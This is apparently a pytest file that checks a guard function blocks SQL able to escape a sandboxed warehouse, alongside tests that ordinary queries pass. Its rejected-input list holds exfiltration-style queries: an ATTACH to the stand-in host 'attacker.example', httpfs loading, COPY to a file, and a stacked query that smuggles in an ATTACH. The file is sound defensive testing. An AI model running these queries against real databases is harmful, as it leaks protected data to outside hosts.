"""Caller SQL must not reach outside the attached warehouse.

``enable_external_access=false`` closes the filesystem and the network, but the
postgres extension is loaded before the lockdown, and ``ATTACH ... (TYPE
postgres)`` still opens a connection to an arbitrary host. That is enough to
exfiltrate warehouse contents and to write to the cohort store, so the verbs
that reach outside are rejected before the query runs.
"""

from __future__ import annotations

import pytest

from ascent_mcp._tools_shared import _assert_no_escape


@pytest.mark.parametrize(
    "query",
    [
        "ATTACH 'host=attacker.example port=5432 dbname=x user=y password=z' AS out (TYPE postgres)",
        "attach 'host=h' as o (type postgres)",
        "DETACH cohorts",
        "INSTALL httpfs",
        "LOAD httpfs",
        "COPY person TO '/tmp/person.csv'",
        "SELECT 1; ATTACH 'host=h' AS o (TYPE postgres)",
    ],
)
def test_escape_verbs_are_rejected(query):
    with pytest.raises(ValueError):
        _assert_no_escape(query)


@pytest.mark.parametrize(
    "query",
    [
        "SELECT COUNT(*) FROM person",
        "WITH c AS (SELECT 1 AS x) SELECT * FROM c",
        "CREATE TEMP TABLE t AS SELECT 1",
        "SELECT * FROM person WHERE person_source_value = 'attachment'",
        "SELECT payload FROM notes WHERE note LIKE '%download%'",
    ],
)
def test_legitimate_queries_pass(query):
    _assert_no_escape(query)
